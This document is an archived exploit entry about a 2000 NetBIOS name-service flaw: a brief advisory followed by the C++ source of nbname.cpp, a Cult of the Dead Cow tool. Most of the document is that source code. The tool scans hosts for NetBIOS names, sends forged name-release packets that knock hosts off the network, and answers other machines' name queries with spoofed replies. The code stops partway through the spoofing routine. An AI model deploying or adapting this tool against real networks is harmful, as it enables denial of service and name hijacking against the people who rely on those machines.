source: http://www.securityfocus.com/bid/1514/info

An attacker can send the NetBIOS name service a NetBIOS Name Conflict message even when the receiving machine is not in the process of registering its NetBIOS name. The target will then not attempt to use that name in any future netwrok connection attempts. This can lead to intermittent connectivity problems, or the loss of all NetBIOS functionality. 

// nbname.cpp - decodes NetBIOS name packets (UDP 137), with some other options

// Copyright 2000 Sir Dystic of the Cult of the Dead Cow - sd@cultdeadcow.com

//

// For Win32 should be compiled with /DWIN32 /MT (use multi-threaded libraries)

// If it complains about socklen_t try adding -Dsocklen_t=int

//

//  Thanks to all the people who helped me with ideas, testing and making it work

//   under Unix, especially:

//   Optyx, FreqOut, Nyar, Netmask, T12, and many others I am too lame to remember



/*



Version history:



v1.8 - July 29, 2000

Discussed nbname at Defcon



v1.9 - August 1, 2000

Began keeping history

Added /SCAN option

Added /RETRY option

Changed /NOBOOTY option to /ALLOW and /DENY (sorry all you anal lovers)

Made commandline options case-insensitive (thanks missnglnk for being aware of 

  strcasecmp() which nobody else mentioned to me)

Added /RESPOND option





  */









#ifdef WIN32



// comment the following line to make a Winsock 1.1 compile 

#define WINSOCK2



#pragma comment(linker, "/SUBSYSTEM:CONSOLE")



#define CLOSESOCKET(x) closesocket(x)

#define GETSOCKETERROR() WSAGetLastError()

#define GETRANDSEED()  GetTickCount()

#define SLEEP(x) Sleep(x)

#define CREATETHREAD(x, y) _beginthread(x, 0, y)

#define EXITTHREAD() _endthread()

#define STRICMP(x, y) stricmp(x, y)

#define STRNICMP(x, y, z) strnicmp(x, y, z)



#include <process.h>



#ifdef WINSOCK2



#include <winsock2.h>

#include <Ws2tcpip.h>



#pragma comment(lib, "ws2_32.lib")



#else



#include <windows.h>

#include <winsock.h>

#pragma comment(lib, "wsock32.lib")



#endif



#include <time.h>

#include <io.h>



#endif





// common includes

#include <stdio.h>

#include <string.h>

#include <stdlib.h>

#include <ctype.h>







#ifndef WIN32



#include <sys/socket.h>

#include <sys/param.h>

#include <sys/types.h>

#include <sys/time.h>

#include <arpa/inet.h>

#include <netinet/in.h>

#include <netdb.h>

#include <unistd.h>

#include <time.h>





typedef unsigned char BYTE, *LPBYTE;

typedef unsigned short WORD, *LPWORD;

typedef unsigned long DWORD, *LPDWORD;

typedef unsigned long BOOL, *LPBOOL;

typedef int SOCKET;

typedef struct sockaddr SOCKADDR;

typedef struct sockaddr_in SOCKADDR_IN;

typedef SOCKADDR *LPSOCKADDR;

typedef SOCKADDR_IN *LPSOCKADDR_IN;

typedef struct hostent HOSTENT;

typedef HOSTENT *LPHOSTENT;

typedef unsigned long ULONG;

typedef unsigned short USHORT;

typedef long LONG;



#define GETSOCKETERROR() 0

#define GETRANDSEED() clock()

#define CLOSESOCKET(x) close(x)

#define SLEEP(x) usleep(x*1000)

#define STRICMP(x, y) strcasecmp(x, y)

#define STRNICMP(x, y, z) strncasecmp(x, y, z)



#define MAKEWORD(a, b)      ((WORD)(((BYTE)(a)) | ((WORD)((BYTE)(b))) << 8))

#define MAKEULONG(l, h) ((ULONG)(((USHORT)(l)) | ((ULONG)((USHORT)(h))) << 16))

#define MAKELONG(l, h)  ((LONG)MAKEULONG(l, h))



#define FALSE 0

#define TRUE 1

#define INVALID_SOCKET -1

#define SOCKET_ERROR -1



#endif





#pragma pack(1)





#define NETBIOSNAMEPORT 137

#define WILDCARDNAME "*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"



// uncomment the following line to display statistics info (windows and samba boxes seem to always set this info to 0s)

//#define STUFFTHATSUSUALLYALLZERO



BOOL g_Astat = FALSE;

BOOL g_Conflict = FALSE;

BOOL g_FindAll = FALSE;

BOOL g_Reverse = FALSE;

BOOL g_NoLocal = FALSE;

BOOL g_NoLocalNet = FALSE;



char *g_OutServsFile = NULL;

char *g_OutAllFile = NULL;

char *g_ASOutFile = NULL;

char *g_SpawnCommand = NULL;

char *g_SpawnArgs = NULL;

char *g_ScanFile = NULL;

char *g_AllowName = NULL;

char *g_DenyName = NULL;

char *g_RespondName = NULL;



DWORD g_TargetIP = INADDR_NONE;

DWORD g_LocalIP = INADDR_NONE;

DWORD g_BroadcastIP = INADDR_BROADCAST;

DWORD g_NetmaskIP = 0;

DWORD g_SweepStartIP = 0;

DWORD g_SweepEndIP = 0;



DWORD g_PacketDelay = 100;

DWORD g_ReceiveTimeout = 0;



WORD g_LocalPort = NETBIOSNAMEPORT;



int g_Retries = 3;



#define ONT_BNODE 0

#define ONT_PNODE 1

#define ONT_MNODE 2

#define ONT_HNODE 3



typedef struct 

{

	BYTE UnitID[6];				// MAC address

	BYTE Jumpers;

	BYTE TestResult;

	WORD Version;

	WORD StatsPeriod;

	WORD NumCRCs;

	WORD NumAlignmentErrors;

	WORD NumCollisions;

	WORD NumSendAborts;

	DWORD NumGoodSends;

	DWORD NumGoodRcvs;

	WORD NumRetransmits;

	WORD NumResourceConditions;

	WORD NumFreeCommandBlocks;

	WORD NumCommandBlocks;

	WORD NumMaxCommandBlocks;

	WORD NumPendingSessions;

	WORD NumMaxPendingSessions;

	WORD NumMaxTotalSessions;

	WORD SessionDataPacketSize;

} NETBIOSSTATS, *PNETBIOSSTATS;



typedef struct

{

	WORD Reserved:13;

	WORD ONT:2;			// Owner Node Type:

						//  00 = B node

                        //  01 = P node

                        //  10 = M node

                        //  11 = Reserved for future use

                        // For registration requests this is the

                        // claimant's type.

                        // For responses this is the actual owner's type.

	WORD fGroup:1;		// Group Name Flag.

						// If one (1) then the RR_NAME is a GROUP NetBIOS name.

						// If zero (0) then the RR_NAME is a UNIQUE NetBIOS name.

} NBFLAGS;





typedef struct

{

	WORD Reserved:9;	// Reserved for future use.  Must be zero (0).

	WORD fPermanent:1;	// Permanent Name Flag.  If one (1) then entry is for the permanent node name.  

						//  Flag is zero (0) for all other names.

	WORD fActive:1;		// Active Name Flag.  All entries have this flag set to one (1).

	WORD fConflict:1;	// Conflict Flag.  If one (1) then name on this node is in conflict.

	WORD fDeregister:1;	// Deregister Flag.  If one (1) then this name is in the process of being deleted.

	WORD OwnerType:2;	// Owner Node Type:

                        //  00 = B node

                        //  01 = P node

                        //  10 = M node

                        //  11 = Reserved for future use

	WORD fGroupName:1;	// Group Name Flag.

						//  If one (1) then the name is a GROUP NetBIOS name.

						//  If zero (0) then it is a UNIQUE NetBIOS name.

} NETBIOSNAMEFLAGS;



typedef struct

{

	char Name[15];		// uncompressed name

	BYTE BinVal;		// binary value

	WORD Flags;			// flags

} NETBIOSNAME, *PNETBIOSNAME;



#define RCODE_FMTERR	0x1

#define RCODE_SRVERR	0x2

#define RCODE_NAMERR	0x3

#define RCODE_IMPERR	0x4

#define RCODE_RFSERR	0x5

#define RCODE_ACTERR	0x6

#define RCODE_CFTERR	0x7



typedef struct 

{

	WORD Type;			// type of recource record

	WORD Class;			// class of resource record (always IN)

	DWORD TTL;			// Time to live

	WORD RDLength;		// length of following resource data

} RESOURCERECORDHEADER, *PRESOURCERECORDHEADER;



#define RRTYPE_A		0x0001

#define RRTYPE_NS		0x0002

#define RRTYPE_NULL		0x000A

#define RRTYPE_NB		0x0020

#define RRTYPE_NBSTAT	0x0021



#define RRCLASS_IN		0x0001



typedef struct 

{

	WORD RCode   : 4;			// response code

	WORD fNM_B   : 1;			// Broadcast flag

	WORD fNM_00  : 2;			// reserved, always 0

	WORD fNM_RA  : 1;			// Recursion Available flag

	WORD fNM_RD  : 1;			// Recursion Desired flag

	WORD fNM_TC  : 1;			// Truncation flag

	WORD fNM_AA  : 1;			// Authoratative answer flag

	WORD OpCode  : 4;			// Operation code

	WORD fResponse:1;			// Response flag

} OPCODEFLAGSRCODE;



typedef struct {

	WORD TransactionID;			// transaction id, responses match original packet, requests are random/sequential

	WORD OpcodeFlagsRcode;		// opcode, flags and rcode

	WORD QDCount;				// number of questions

	WORD ANCount;				// number of answer resource records

	WORD NSCount;				// number of name service resource records

	WORD ARCount;				// number of athoratative resource records

} NBNAMEHEADER, *PNBNAMEHEADER;



#define OPCODE_QUERY		0

#define OPCODE_REGISTRATION	5

#define OPCODE_RELEASE		6

#define OPCODE_WACK			7

#define OPCODE_REFRESH		8



typedef struct{

	BYTE Name[34];		// compressed name

	WORD Type;			// question type

	WORD Class;			// question class (always type IN - Internet)

} QUESTION, *PQUESTION;



#define QUESTION_TYPE_NB		0x0020	// general name request

#define QUESTION_TYPE_NBSTAT	0x0021	// stats request



#define QUESTION_CLASS_IN		0x0001	// internet class



unsigned char hexvals[16] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};





void PrintNetbiosName(unsigned char *name)

{

	BYTE BinVal;

	char PrintName[16];



	memcpy(PrintName, name, 15);

	PrintName[15] = 0;



	BinVal = name[15];



	printf("%15s <%02x>", PrintName, BinVal);

}



int NetbiosNameToString(char *dest, const BYTE *src, int PacketLeft)

{

	int y;

	static unsigned char Name[32];

	unsigned char UncompressedName[256];

	unsigned char hexbuf[3];

	char *ptr;

	BYTE len;



	// get length of string

	len = *src;



	if (len & 0xC0) // name pointer or other

	{

		len = 0;

		// just return last name read

	} else {

		if (len <= PacketLeft)

		{

			puts("[Short name, aborting]");

			return 0;

		}



		memset(UncompressedName, 0, sizeof(UncompressedName));



		memset(Name, ' ', sizeof(Name) );



		memcpy(UncompressedName, src+1, len);



		for (y = 0; y < 16; y++)

		{

			hexbuf[0] = hexvals[UncompressedName[y*2] - 'A'];

			hexbuf[1] = hexvals[UncompressedName[y*2+1] - 'A'];

			hexbuf[2] = 0;

			Name[y] = (BYTE)strtoul((char *)hexbuf, &ptr, 16);

		}

	}



	memcpy(dest, (const char *)Name , 16);



	return (int)(len+2);

}



int StringToNetbiosName(char *dest, const char *src, BYTE binval)

{

	int x, y;

	unsigned char Name[16];

	unsigned char UncompressedName[256];

	char hexbuf[2];



	// set name to all zeros

	memset(Name, 0, sizeof(Name));



	// get length of name

	x = strlen(src);



	// truncate at 15th char

	if (x > 15) x = 15;



	// copy up to 15 chars leaving the rest space padded

	memcpy(Name, src, x);



	// uppercase the name

	Name[15] = 0;

	for (y = 0; y < 15; y++)

		Name[y] = toupper((int)Name[y]);



	// set 16th binary char

	Name[15] = binval;



	UncompressedName[0] = 32;



	// convert each char to hex

	for (x = 0; x < 16; x++)

		sprintf((char *)&UncompressedName[(x*2)+1], "%02X", (DWORD)Name[x] );



	// add 'A' to each char

	for (x = 1; x <= 32; x++)

	{

		char *ptr;



		hexbuf[0] = UncompressedName[x];

		hexbuf[1] = 0;

		UncompressedName[x] = 'A' + (BYTE)strtoul(hexbuf, &ptr, 16);;

	}



	UncompressedName[33] = 0;

#if 0

	// add SCOPE_ID 

	UncompressedName[33] = 7;

	memcpy((char *)&UncompressedName[34], "NETBIOS", 7);



	UncompressedName[41] = 3;

	memcpy((char *)&UncompressedName[42], "COM", 3);

#endif



	// set the length

	x = 34;



	memcpy(dest, UncompressedName, x);



	return x;

}



			



DWORD FormPacket(unsigned char *buff, WORD TranID, BYTE Opcode, char *QuestionName, WORD QuestionType, BOOL fResponse, BOOL fBroadcast, BOOL fTruncated, BOOL fRecursionAvailable, BOOL fRecursionDesired, BOOL fAuthoratativeAnswer, WORD RCode, WORD QDCount, WORD ANCount, WORD NSCount, WORD ARCount, DWORD TargetIP, BOOL fGroup, BYTE ONT)

{

	NBFLAGS nbflags;

	PNBNAMEHEADER pnbnameheader = (PNBNAMEHEADER)buff;

	OPCODEFLAGSRCODE Wcode;

	BYTE *ptr, *firstnameptr = NULL;

	DWORD d;

	WORD w;



	memset(pnbnameheader, 0, sizeof(NBNAMEHEADER) );



	pnbnameheader->TransactionID = TranID;	// Transaction ID



	Wcode.fResponse = fResponse;		// request not response

	Wcode.OpCode = Opcode;				// operation code (command)

	Wcode.fNM_00 = 0;					// always 0

	Wcode.fNM_B = fBroadcast;			// broadcast

	Wcode.fNM_RA = fRecursionAvailable;	// always 0 for requests

	Wcode.fNM_RD = fRecursionDesired;	// no recursion requested

	Wcode.fNM_TC = fTruncated;			// not truncated

	Wcode.fNM_AA = fAuthoratativeAnswer;// always 0 for requests

	Wcode.RCode = RCode;



	pnbnameheader->OpcodeFlagsRcode = htons(*((WORD*)&Wcode));



	pnbnameheader->QDCount = htons(QDCount);

	pnbnameheader->ANCount = htons(ANCount);

	pnbnameheader->ARCount = htons(ARCount);

	pnbnameheader->NSCount = htons(NSCount);



	ptr = (BYTE *)(pnbnameheader + 1);



	if (QDCount > 0)

	{

		PQUESTION pquestion = (PQUESTION)ptr;



		StringToNetbiosName((char *)pquestion->Name, QuestionName, QuestionName[15]);



		firstnameptr = pquestion->Name;



		pquestion->Type = htons(QuestionType);

		pquestion->Class = htons(QUESTION_CLASS_IN);

		

		ptr += sizeof(QUESTION);

	}



	if (ANCount > 0)

	{

		d = StringToNetbiosName((char *)ptr, QuestionName, QuestionName[15]);



		ptr += d;



		PRESOURCERECORDHEADER presrecordheader = (PRESOURCERECORDHEADER)ptr;



		presrecordheader->Class = htons(RRCLASS_IN);

		presrecordheader->RDLength = htons(6);

		presrecordheader->TTL = 0;

		presrecordheader->Type = htons(RRTYPE_NB);



		ptr += sizeof(RESOURCERECORDHEADER);



		nbflags.fGroup = fGroup;

		nbflags.Reserved = 0;

		nbflags.ONT = ONT;

		

		memcpy(&w, &nbflags, sizeof(WORD) );



		w = htons(w);



		memcpy(ptr, &w, sizeof(WORD));



		ptr += sizeof(WORD);



		*((DWORD *)ptr) = TargetIP;



		ptr += sizeof(DWORD);

	}



	if (ARCount > 0)

	{

		if (firstnameptr == NULL)

		{

			d = StringToNetbiosName((char *)ptr, QuestionName, QuestionName[15]);

			ptr += d;

		}

		else

		{

			*((WORD *)ptr) = htons(0xC000 | (firstnameptr - buff));

			ptr+=2;

		}



		PRESOURCERECORDHEADER presrecordheader = (PRESOURCERECORDHEADER)ptr;



		presrecordheader->Class = htons(RRCLASS_IN);

		presrecordheader->RDLength = htons(6);

		presrecordheader->TTL = 0;

		presrecordheader->Type = htons(RRTYPE_NB);



		ptr += sizeof(RESOURCERECORDHEADER);



		nbflags.fGroup = fGroup;

		nbflags.Reserved = 0;

		nbflags.ONT = ONT;

		

		memcpy(&w, &nbflags, sizeof(WORD) );



		w = htons(w);



		memcpy(ptr, &w, sizeof(WORD));



		ptr += sizeof(WORD);



		*((DWORD *)ptr) = TargetIP ;

		



		ptr += sizeof(DWORD);

	}



	return (DWORD)(ptr - buff);

}











DWORD ProcessResourceRecord(const BYTE *ptr, int Type, SOCKET sock, LPSOCKADDR_IN psockaddr, int PacketLeft)

{

	BYTE outbuff[1024];

	char NameBuff[256];

	WORD w, RRType, RRClass, RRRDLength, NameFlags, TranID;

	DWORD d, RRTTL;

	BYTE NumNames;

	BYTE BinVal;

	NETBIOSNAMEFLAGS NameFlagsStruct;

	NBFLAGS nbflags;

	int x;



	d = NetbiosNameToString(NameBuff, ptr, PacketLeft);



	if (d == 0) return 0;



	PrintNetbiosName((BYTE *)NameBuff);

	puts("");

	ptr += d;



	if (PacketLeft - d < sizeof(RESOURCERECORDHEADER) || PacketLeft - d < sizeof(RESOURCERECORDHEADER) + ntohs(((PRESOURCERECORDHEADER)ptr)->RDLength) )

	{

		puts("[Short record, aborting]");

		return 0;

	}



	PRESOURCERECORDHEADER presrecordheader = (PRESOURCERECORDHEADER)ptr;





	RRType = ntohs(presrecordheader->Type);

	RRClass = ntohs(presrecordheader->Class);

	RRTTL = ntohl(presrecordheader->TTL);

	RRRDLength = ntohs(presrecordheader->RDLength);



	ptr = (LPBYTE)(presrecordheader+1);





	switch (RRType)

	{

	case RRTYPE_A:

		printf("IP Address Resource Record:\n");

		break;

	case RRTYPE_NS:

		printf("Name Service Resource Record:\n");

		break;

	case RRTYPE_NULL:

		printf("NULL Resource Record:\n");

		break;

	case RRTYPE_NB	:

		printf("NetBIOS Name Service Resource Record:\n");

		break;

	}



	if (g_FindAll && RRType == RRTYPE_NB && memcmp(NameBuff, WILDCARDNAME, 16) == 0)

	{

		d = FormPacket(outbuff, rand(), OPCODE_QUERY, WILDCARDNAME, QUESTION_TYPE_NBSTAT, FALSE, TRUE, FALSE, FALSE, FALSE, FALSE, 0, 1, 0,	0, 0, 0, 0, ONT_BNODE);



		sendto(sock, (const char *)outbuff, d, 0, (LPSOCKADDR)psockaddr, sizeof(SOCKADDR_IN) );



		printf(" **** NBSTAT request packet sent\n");



	}



	switch (RRType)

	{

	case RRTYPE_A:

	case RRTYPE_NS:

		break;

	case RRTYPE_NULL:

	case RRTYPE_NB	:



		for (x = 0; x < RRRDLength / 6; x++)

		{

			memcpy(&w, ptr, sizeof(w) );

			w = ntohs(w);

			memcpy(&nbflags, &w, sizeof(w) );

			ptr += sizeof(WORD);



			printf("Owner Node Type: ");

			switch (nbflags.ONT)

			{

			case ONT_BNODE:

				printf("B-NODE ");

				break;

			case ONT_PNODE:

				printf("P-NODE ");

				break;

			case ONT_MNODE:

				printf("M-NODE ");

				break;

			case ONT_HNODE:

				printf("H-NODE ");

			}



			printf("  ");



			if (nbflags.fGroup)

				printf("GROUP  ");

			else

				printf("UNIQUE ");



			printf("  -  ");



			printf("IP: %u.%u.%u.%u", *ptr, *(ptr+1), *(ptr+2),*(ptr+3));



			ptr+=4;



			puts("");



		}



		break;

	case RRTYPE_NBSTAT:

		{

			FILE *outfile = NULL;



			printf("Node Status Resource Record:\n");

			NumNames = *ptr;

			ptr++;

			PNETBIOSNAME pnetbiosname = (PNETBIOSNAME)ptr;



			if (NumNames > 0 && g_OutAllFile != NULL)

			{

				outfile = fopen(g_OutAllFile , "at");

				if (outfile != NULL)

				{

					BinVal = pnetbiosname->BinVal;

					pnetbiosname->BinVal = 0;

					fprintf(outfile, "%s %s\n", inet_ntoa(psockaddr->sin_addr), pnetbiosname->Name);

					pnetbiosname->BinVal = BinVal;

					fclose(outfile);

					printf(" **** Machine added to %s\n", g_OutAllFile );

					outfile = NULL;

				}

			}



			if (g_ASOutFile != NULL)

			{

				outfile = fopen(g_ASOutFile, "at");

				if (outfile != NULL)

				{

					time_t curtime = time(NULL);

					fprintf(outfile, "ASTAT response from %s at %s", inet_ntoa(psockaddr->sin_addr), ctime(&curtime) );

				}

			}





			for (w = 0; w < NumNames; w++)

			{

				char *tptr;

				BinVal = pnetbiosname->BinVal;

				pnetbiosname->BinVal = 0;



				printf("%s <%02x>  ", pnetbiosname->Name, BinVal );



				if (outfile != NULL)

					fprintf(outfile, "%s <%02x>  ", pnetbiosname->Name, BinVal );



				pnetbiosname->BinVal = BinVal;



				NameFlags = ntohs(pnetbiosname->Flags);

				memcpy(&NameFlagsStruct, &NameFlags, sizeof(NameFlags) );

				if (NameFlagsStruct.fActive)

					tptr = "ACTIVE   ";

				else

					tptr = "INACTIVE ";



				printf("%s", tptr);

				if (outfile != NULL)

					fprintf(outfile, "%s", tptr);



				if (NameFlagsStruct.fGroupName)

					tptr = "GROUP  ";

				else

					tptr = "UNIQUE ";



				printf("%s", tptr);

				if (outfile != NULL)

					fprintf(outfile, "%s", tptr);



				if (NameFlagsStruct.fPermanent)

					tptr = "PERMANENT ";

				else

					tptr = "NOTPERM   ";



				printf("%s", tptr);

				if (outfile != NULL)

					fprintf(outfile, "%s", tptr);



				if (NameFlagsStruct.fConflict)

					tptr = "INCONFLICT ";

				else

					tptr = "NOCONFLICT ";



				printf("%s", tptr);

				if (outfile != NULL)

					fprintf(outfile, "%s", tptr);





				if (NameFlagsStruct.fDeregister)

					tptr = "DEREGISTERED ";

				else

					tptr = "NOTDEREGED   ";



				printf("%s", tptr);

				if (outfile != NULL)

					fprintf(outfile, "%s", tptr);





				switch (NameFlagsStruct.OwnerType)

				{

				case ONT_BNODE:

					tptr = "B-NODE ";

					break;

				case ONT_PNODE:

					tptr = "P-NODE ";

					break;

				case ONT_MNODE:

					tptr = "M-NODE ";

					break;

				case ONT_HNODE:

					tptr = "H-NODE ";

				}



				printf("%s\n", tptr);

				if (outfile != NULL)

					fprintf(outfile, "%s\n", tptr);



				if (!NameFlagsStruct.fGroupName && BinVal == 0x20 )

				{

					if (g_OutServsFile != NULL)

					{

						FILE *outfile2 = fopen(g_OutServsFile, "at");

						if (outfile2 != NULL)

						{

							pnetbiosname->BinVal = 0;



							fprintf(outfile2, "%s %s\n", inet_ntoa(psockaddr->sin_addr), pnetbiosname->Name);



							pnetbiosname->BinVal = BinVal;



							fclose(outfile2);



							printf(" **** Machine added to %s\n", g_OutServsFile );

						}

					}



					if (g_SpawnCommand != NULL)

					{

						char buff[1024];



						pnetbiosname->BinVal = 0;



						sprintf(buff, "%s", inet_ntoa(psockaddr->sin_addr));

#ifdef WIN32



						if (_spawnlpe(_P_NOWAIT, g_SpawnCommand, g_SpawnCommand, g_SpawnArgs, pnetbiosname->Name, buff, NULL, NULL) == -1)

							printf(" *** Error spawning \"%s\"\n", g_SpawnCommand);

						else

						{

							printf(" **** Spawned \"%s\"\n", g_SpawnCommand);

						}

#else

						if (fork() == 0)

							if (execlp(g_SpawnCommand, g_SpawnCommand, g_SpawnArgs, pnetbiosname->Name, buff, NULL) == -1 )

							{

								printf(" *** Error spawning \"%s %s %s %s\"\n", g_SpawnCommand, g_SpawnArgs, pnetbiosname->Name, buff );

								exit(0);

							}

#endif



						pnetbiosname->BinVal = BinVal;

						SLEEP(20);

					}

				}



				

				if (g_Conflict && !NameFlagsStruct.fConflict )

				{

					TranID = rand();



					d = FormPacket(outbuff, TranID, OPCODE_RELEASE, pnetbiosname->Name, QUESTION_TYPE_NB, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, 0, 1, 0, 0, 1, psockaddr->sin_addr.s_addr, NameFlagsStruct.fGroupName, NameFlagsStruct.OwnerType);



					sendto(sock, (const char *)outbuff, d, 0, (LPSOCKADDR)psockaddr, sizeof(SOCKADDR_IN) );



					printf(" **** Name release sent to %s\n", inet_ntoa(psockaddr->sin_addr) );

				}



				pnetbiosname++;

			}





			PNETBIOSSTATS pnetbiosstats = (PNETBIOSSTATS)pnetbiosname;



			printf("MAC Address:             %02X-%02X-%02X-%02X-%02X-%02X\n", pnetbiosstats->UnitID[0], pnetbiosstats->UnitID[1], pnetbiosstats->UnitID[2], pnetbiosstats->UnitID[3], pnetbiosstats->UnitID[4], pnetbiosstats->UnitID[5] );

			if (outfile != NULL)

				fprintf(outfile, "MAC Address:             %02X-%02X-%02X-%02X-%02X-%02X\n\n", pnetbiosstats->UnitID[0], pnetbiosstats->UnitID[1], pnetbiosstats->UnitID[2], pnetbiosstats->UnitID[3], pnetbiosstats->UnitID[4], pnetbiosstats->UnitID[5] );



#ifdef STUFFTHATSUSUALLYALLZERO

			printf("\nStatistics:\n");

			printf("Jumpers:                 0x%02x\n", pnetbiosstats->Jumpers);

			printf("Test result:             0x%02x\n", pnetbiosstats->TestResult);

			printf("Version:                 %d.%d\n", HIBYTE(pnetbiosstats->Version), LOBYTE(pnetbiosstats->Version) );

			printf("Stats period:            0x%04x\n", ntohs(pnetbiosstats->StatsPeriod) );

			printf("Num CRCs:                %u\n", ntohs(pnetbiosstats->NumCRCs ) );

			printf("Num Alignment errs:      %u\n", ntohs(pnetbiosstats->NumAlignmentErrors ) );

			printf("Num Collisions:          %u\n", ntohs(pnetbiosstats->NumCollisions ) );

			printf("Num Send Aborts:         %u\n", ntohs(pnetbiosstats->NumSendAborts ) );

			printf("Num Good Sends:          %u\n", ntohl(pnetbiosstats->NumGoodSends ) );

			printf("Num Good Receives:       %u\n", ntohl(pnetbiosstats->NumGoodRcvs ) );

			printf("Num Retransmits:         %u\n", ntohs(pnetbiosstats->NumRetransmits ) );

			printf("Num Resource Conditions: %u\n", ntohs(pnetbiosstats->NumResourceConditions ) );

			printf("Free Command Blocks:     %u\n", ntohs(pnetbiosstats->NumFreeCommandBlocks ) );

			printf("Total Command Blocks:    %u\n", ntohs(pnetbiosstats->NumCommandBlocks ) );

			printf("Max Command Blocks       %u\n", ntohs(pnetbiosstats->NumMaxCommandBlocks ) );

			printf("Pending Sessions:        %u\n", ntohs(pnetbiosstats->NumPendingSessions ) );

			printf("Max Pending Sessions:    %u\n", ntohs(pnetbiosstats->NumMaxPendingSessions ) );

			printf("Max Total Sessions:      %u\n", ntohs(pnetbiosstats->NumMaxTotalSessions ) );

			printf("Session Data Packet Size:%u\n", ntohs(pnetbiosstats->SessionDataPacketSize ) );

#endif



			if (outfile != NULL)

			{

				fclose(outfile);

				outfile = NULL;

			}



		}

		break;

	default:

		printf("Unknown resource record type: 0x%04x\n", RRType);

		break;

	}



	return d + RRRDLength + sizeof(RESOURCERECORDHEADER);

}





DWORD ProcessPacket(char *buff, int packetsize, SOCKET sock, LPSOCKADDR_IN psockaddr)

{

	char NameBuff[256];

	PNBNAMEHEADER pnbnameheader = (PNBNAMEHEADER)buff;

	OPCODEFLAGSRCODE Wcode;

	WORD w, QDCount, ANCount, NSCount, ARCount, RCode, OPCode;

	BOOL fResponse, fBroadcast, fRecursionAvailable, fRecursionDesired, fTruncated, fAuthoratativeAnswer;

	const BYTE *ptr;

	DWORD d;



	if (packetsize < sizeof(NBNAMEHEADER) )

	{

		puts("[Short packet, aborting]");

		return 0;

	}



	QDCount = ntohs(pnbnameheader->QDCount);

	ANCount = ntohs(pnbnameheader->ANCount);

	ARCount = ntohs(pnbnameheader->ARCount);

	NSCount = ntohs(pnbnameheader->NSCount);



	w = ntohs(pnbnameheader->OpcodeFlagsRcode);



	memcpy(&Wcode, &w, sizeof(w) );



	RCode = Wcode.RCode;



	OPCode = Wcode.OpCode;



	fResponse = Wcode.fResponse;

	fBroadcast = Wcode.fNM_B;

	fRecursionAvailable = Wcode.fNM_RA;

	fRecursionDesired = Wcode.fNM_RD;

	fTruncated = Wcode.fNM_TC;

	fAuthoratativeAnswer = Wcode.fNM_AA;



	ptr = (const BYTE *)(pnbnameheader+1);



	if (RCode != 0)

	{

		printf("RCode: ");



		switch (RCode)

		{

		case RCODE_FMTERR:

			printf("Format Error: Request was invalidly formatted");

			break;

		case RCODE_SRVERR:

			printf("Server Failure: Problem with NBNS, cannot process name");

			break;

		case RCODE_NAMERR:

			printf("Name Error: The name requested does not exist.");

			break;

		case RCODE_IMPERR:

			printf("Unsupported Request Error");

			break;

		case RCODE_RFSERR:

			printf("Refused Error.  For policy reasons server will not register this name from this host.");

			break;

		case RCODE_ACTERR:

			printf("Active Error.  Name is owned by another node.");

			break;

		case RCODE_CFTERR:

			printf("Name in Conflict Error.  A UNIQUE name is owned by more than one node.");

			break;

		default:

			printf("Unknown RCODE! 0x%04x", RCode);

			break;

		}



		puts("");

	}





	printf("OPCode: ");

	switch (OPCode)

	{

	case OPCODE_QUERY:

		printf("QUERY");

		break;

	case OPCODE_REGISTRATION:

		printf("REGISTRATION");

		break;

	case OPCODE_RELEASE:

		printf("RELEASE");

		break;

	case OPCODE_WACK:

		printf("WACK");

		break;

	case OPCODE_REFRESH:

		printf("REFRESH");

		break;

	default:

		printf("Unknown OPCODE! 0x%04x", OPCode);

		break;

	}

	puts("");



	printf("Flags: ");

	if (fResponse)

		printf("Response ");



	if (fBroadcast)

		printf("Broadcast ");



	if (fRecursionAvailable)

		printf("RecursionAvailable ");



	if (fRecursionDesired)

		printf("RecursionDesired ");



	if (fTruncated)

		printf("Truncated ");



	if (fAuthoratativeAnswer)

		printf("AuthoratativeAnswer ");



	puts("");



	// all packets I've seen have no more than 1 of any type of record

	if (QDCount > 1 || ANCount > 1 || NSCount > 1 || ARCount > 1)

	{

		puts("[Invalid record count, aborting]");

		return 0;

	}



	for (w = 0; w < QDCount; w++)

	{

		printf("Question[%d]:\n", w);



		if (packetsize - (int)((char *)ptr - buff) < sizeof(QUESTION))

		{

			puts("[Short packet, aborting]");

			return 0;

		}



		PQUESTION pquestion = (PQUESTION)ptr;



		d = NetbiosNameToString(NameBuff, pquestion->Name, (char *)ptr - buff);



		ptr += sizeof(QUESTION);



		PrintNetbiosName((BYTE *)NameBuff);

		puts("");



		switch (ntohs(pquestion->Type))

		{

		case QUESTION_TYPE_NB:

			printf("General name request");

			break;

		case QUESTION_TYPE_NBSTAT:

			printf("Netbios Stats request");

			break;

		default:

			printf("Unknown query type:0x%04x", ntohs(pquestion->Type) );

			break;

		}



		puts("");



		if (ntohs(pquestion->Class) != QUESTION_CLASS_IN )

			printf("Class != TYPE INTERNET!\n");



		if (g_Reverse && !fResponse && ntohs(pquestion->Type) == QUESTION_TYPE_NBSTAT)

		{

			BYTE outbuff[1024];

			d = FormPacket(outbuff, rand(), OPCODE_QUERY, WILDCARDNAME, QUESTION_TYPE_NBSTAT, FALSE, TRUE, FALSE, FALSE, FALSE, FALSE, 0, 1, 0, 0, 0, psockaddr->sin_addr.s_addr, 0, ONT_BNODE);



			sendto(sock, (const char *)outbuff, d, 0, (LPSOCKADDR)psockaddr, sizeof(SOCKADDR_IN) );



			printf(" **** NBSTAT QUERY packet sent to %s\n", inet_ntoa(psockaddr->sin_addr));

		}





		if (g_RespondName != NULL && !fResponse && OPCode == OPCODE_QUERY && ntohs(pquestion->Type) == QUESTION_TYPE_NB)

		{

			BYTE outbuff[1024];

			BOOL DoResponce = FALSE;



			if ( strcmp(g_RespondName, "*") == 0 || STRNICMP(NameBuff, g_RespondName, strlen(g_RespondName)) == 0)

				DoResponce = TRUE;

			else if (access(g_RespondName, 3) == 0)

			{

				FILE *InFile = fopen(g_RespondName, "rt");



				if (InFile == NULL)

					printf("Unable to open %s\n", g_RespondName);

				else

				{

					char InBuff[1024];



					while (DoResponce == FALSE && fgets(InBuff, 1024, InFile) != NULL)

					{

						char *p = strchr(InBuff, '\n');

						if (p) *p = 0;



						if (STRNICMP(NameBuff, InBuff, strlen(InBuff)) == 0)

							DoResponce = TRUE;

					}



					fclose(InFile);

				}

			}





			if (DoResponce)

			{

